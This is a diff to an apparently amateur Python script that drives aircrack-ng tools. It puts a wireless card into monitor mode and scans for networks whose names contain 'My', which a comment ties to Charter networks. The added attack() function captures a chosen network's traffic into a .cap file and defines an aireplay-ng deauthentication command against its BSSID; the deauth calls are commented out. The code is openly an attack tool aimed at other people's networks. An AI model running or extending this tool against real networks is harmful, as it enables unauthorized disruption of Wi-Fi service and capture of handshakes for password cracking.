@@ -81,15 +81,15 @@ def checkProcesses():
     checkProcessesProc = sp.run(['airmon-ng','check'], capture_output=True, text=True)
     if (checkProcessesProc.stdout.find('F')):
         print(Fore.RED,'Found interfering processes',Fore.BLUE)
-        usrInput = input('Killing processes will disconnect you from the Internet, would you like to continue? (y/n) ')
+        usrInput = input(' Killing processes will disconnect you from the Internet, would you like to continue? (y/n) ')
         if usrInput == 'y' or usrInput == 'yes':
-            print('Killing processes...')
+            print(' Killing processes...')
             sp.run(['airmon-ng','check','kill'], capture_output=True)
             t.sleep(5)
-            monitorToggle(interface,0)
+            monitorToggle(getInterface(0),0)
         elif usrInput == 'n' or usrInput == 'no':
             print('Attempting to toggle Monitor mode, this may not work without killing the interfering processes.')
-            monitorToggle(interface,0)
+            monitorToggle(getInterface(0),0)
     else:
         print('No interfering processes - GOOD TO GO')
 
@@ -104,7 +104,7 @@ def monitorToggle(interface, mode):     # Runs airmon-ng to start/stop Monitor m
         print(Fore.GREEN,'Monitor Mode Disabled & Internet Capabilities Re-Enabled',Style.RESET_ALL)
 
 def findTarget():
-    command = ['airodump-ng','-K','1','-a','-R',"'(My.)'",'-w','targets','--output-format','csv',getInterface(0),]
+    command = ['airodump-ng','-K','1','-R',"'(My.)'",'-w','targets','--output-format','csv',getInterface(0),]
     process = sp.Popen(command, stdout=sp.PIPE, text=True)
     # print(Fore.BLUE,'Scanning for networks')
     t.sleep(1)
@@ -153,7 +153,7 @@ def findFile():
         for x in ls:
             print(Fore.BLUE, '|', Fore.WHITE, ls.index(x), Fore.BLUE, '|', Fore.WHITE, x, Fore.BLUE,'|', Style.RESET_ALL)
         print(Fore.BLUE,'+------------------------+',Fore.CYAN)
-        select = int(input(' Select a file:'))
+        select = int(input(' Select a file: '))
         print(Fore.YELLOW, ls[select], Style.RESET_ALL)
         return ls[select]
     else:
@@ -161,40 +161,95 @@ def findFile():
     
 
 def readFile():
+    # initial internal variables - file, count, networks, & choice
     file = findFile()
-    # rows = []
-    # with open(file, newline='') as csv:
-    #     parse = csv.read().split(',')
-    #     for x in parse:
-    #         if x == :
-    #             print('FOUND NEW LINE')
-    #     # print(parse)
-    # reading csv file 
+    count = 0
+    networks = {}
+    choice = ''
     with open(file, 'r') as csvfile: 
         # creating a csv reader object 
         csvreader = csv.reader(csvfile) 
 
         # print header
-        print(Fore.BLUE,'+--------BSSID-----------Power Level-----------Channel-----------Network Name-----------+',Fore.WHITE)
+        print(Fore.BLUE,'+---#--------BSSID-----------Power Level-----------Channel-----------Network Name-----------+',Fore.WHITE)
         for row in csvreader:
             # skip empty rows
             if not row:
                 continue
             # skip first row
-            if row.__contains__('BSSID'):
+            elif row.__contains__('BSSID'):
                 continue
             # skip second row
-            if row.__contains__('Station MAC'):
+            elif row.__contains__('Station MAC'):
                 continue
             # skip networks without ESSID/Name
-            if row[6] == '':
+            elif row[6] == '':
                 continue
             # skip networks that are not Charter networks
-            if 'My' not in row[6]:
+            elif 'My' not in row[6]:
                 continue
-            
-            print(Fore.BLUE,'| ',Fore.WHITE,row[0],'      ',row[3],'        ',row[4],'           ',row[6],Fore.BLUE,'  |',Fore.WHITE)
-            print(Fore.BLUE,'+---------------------------------------------------------------------------------------+',Style.RESET_ALL)
+            # display and put networks in a dictionary that conatins a list of properties
+            else:
+                count += 1 
+                BSSID = row[5]  # Network MAC address | either 0 or 5... idk yet
+                Power = row[3].strip()  # Network Power level
+                Channel = row[4].strip()    # Network Channel
+                Name = row[6]   # Network ESSID/Name
+                print(Fore.BLUE, '| ', Fore.WHITE, count, ' ', BSSID, '       ', Power, '               ', Channel, '        ', Name, Fore.BLUE, '      |', Fore.WHITE)
+                print(Fore.BLUE,'+-------------------------------------------------------------------------------------------+',Fore.CYAN)
+                networks[count] = [BSSID,Power,Channel,Name]
+    print(networks)
+
+    choice  = int(input('Select a network: '))
+    print('Selected:',networks[choice])
+    attack(networks[choice])
+
+def attack(target):
+    # internal variables - BSSID, Channel, Name, & fileName
+    BSSID = target[0]
+    Channel = target[2]
+    Name = target[3]
+    fileName = 'capture_'+Name
+    interface = getInterface(0)
+
+    # Commands - airodump-ng: capture data & aireplay-ng: deauth network
+    command_1 = ['airodump-ng','-c',Channel,'--bssid',BSSID,'-w',fileName,'--output-format','cap',interface]
+    command_2 = ['aireplay-ng','--deauth',5,'-a',BSSID,interface]
+
+    process_1 = sp.Popen(command_1)
+    # process_2 = sp.run(command_2)
+    # process_2 = sp.Popen(command_2)
+
+    t.sleep(2)
+    print(Fore.RED,'Attacking network...')
+    t.sleep(2)
+    print(Fore.LIGHTMAGENTA_EX,'Attacking network...')
+    t.sleep(2)
+    print(Fore.YELLOW,'Attacking network...')
+    t.sleep(2)
+    print(Fore.LIGHTGREEN_EX,'Attacking network...')
+    t.sleep(2)
+    # sp.run(command_2)
+    print(Fore.GREEN,'Attacking network...')
+    t.sleep(2)
+    print(Fore.CYAN,'Attacking network...')
+    t.sleep(2)
+    print(Fore.BLUE,'Attacking network...')
+    t.sleep(2)
+    print(Fore.CYAN,'Attacking network...')
+    t.sleep(2)
+    print(Fore.GREEN,'Attacking network...')
+    t.sleep(2)
+    # sp.run(command_2)
+    print(Fore.LIGHTGREEN_EX,'Attacking network...')
+    t.sleep(2)
+    print(Fore.YELLOW,'Attacking network...')
+    t.sleep(2)
+    print(Fore.LIGHTMAGENTA_EX,'Attacking network...')
+    t.sleep(2)
+    print(Fore.RED,'Attacking network...')
+    
+    process_1.send_signal(signal.SIGINT)
 
 
 def start():
@@ -206,4 +261,6 @@ welcome()       # prints title
 # start()         # Start the process/function/procedure tree
 
 # -------SANDBOX--------
-readFile()
+# readFile()
+
+# monitorToggle(getInterface(0),1)
